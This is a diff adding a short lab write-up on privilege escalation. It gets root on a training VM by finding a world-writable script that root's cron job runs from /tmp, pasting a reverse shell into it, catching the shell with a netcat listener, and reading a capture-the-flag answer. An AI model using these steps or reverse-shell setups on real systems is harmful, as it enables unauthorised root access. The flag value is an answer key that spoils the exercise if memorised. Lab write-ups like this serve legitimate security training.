@@ -1,3 +1,21 @@
 Questions 2
 Connect to VM 2 and look for another misconfigured cron job. Once found, exploit it and obtain a root shell in order to get a flag.
 
+ssh joe@192.168.214.214
+
+# Find another misconfigured cron job
+grep "CRON" /var/log/syslog
+...
+May  1 01:31:01 debian-privesc CRON[1414]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
+May  1 01:31:01 debian-privesc CRON[1415]: (root) CMD (/bin/bash /tmp/this_is_fine.sh)
+...
+
+ls -l 
+-rwxrwxrw- 1 root root 12 May  1 01:30 /tmp/this_is_fine.sh
+
+nano /tmp/this_is_fine.sh
+# Paste the code from bash-revsh.sh
+
+nc -lvnp 6666
+cat flag.txt
+OS{aded59774218cf596a76c24f704af8aa}
